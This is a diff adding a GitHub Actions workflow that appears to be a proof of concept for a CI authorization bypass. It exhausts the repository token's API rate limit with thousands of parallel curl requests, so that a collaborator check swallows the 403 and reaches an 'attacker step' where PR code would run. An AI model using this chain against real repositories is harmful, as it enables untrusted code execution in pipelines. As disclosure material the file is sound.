@@ -1,0 +1,41 @@
+name: chain
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+  issues: write
+  pull-requests: write
+jobs:
+  chain:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 30
+    steps:
+      - name: Burn repo token quota (5000/hr shared bucket)
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          seq 1 5400 | xargs -P 40 -I{} sh -c 'curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" https://api.github.com/repos/${{ github.repository }}' | sort | uniq -c
+      - name: ASSERT-equivalent (403 must be swallowed)
+        uses: actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b # v7.1.0
+        with:
+          script: |
+            const username='octocat';
+            try {
+              const r = await github.rest.repos.checkCollaborator({owner: context.repo.owner, repo: context.repo.repo, username});
+              console.log(`STATUS ${r.status}`);
+            } catch (e) {
+              console.log(`THREW status=${e.status} msg=${e.message}`);
+              if (e.status === 404) { throw new Error(`${username} is NOT a collaborator.`); }
+              else if (e.status === 403) { console.log(`User is not a collaborator: ${e.message}`); }
+              else { console.log(`Error checking collaborator status: ${e.message}`); }
+            }
+      - name: Comment-workflow-started equivalent (comment-on-pr)
+        if: ${{ true }}
+        uses: actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b # v7.1.0
+        with:
+          script: |
+            const r = await github.rest.issues.createComment({issue_number: 1, owner: context.repo.owner, repo: context.repo.repo, body: 'poc'});
+            console.log('comment id', r.data.id);
+      - name: ATTACKER STEP (checkout PR + run PR code)
+        run: echo "ATTACKER_STEP_REACHED"
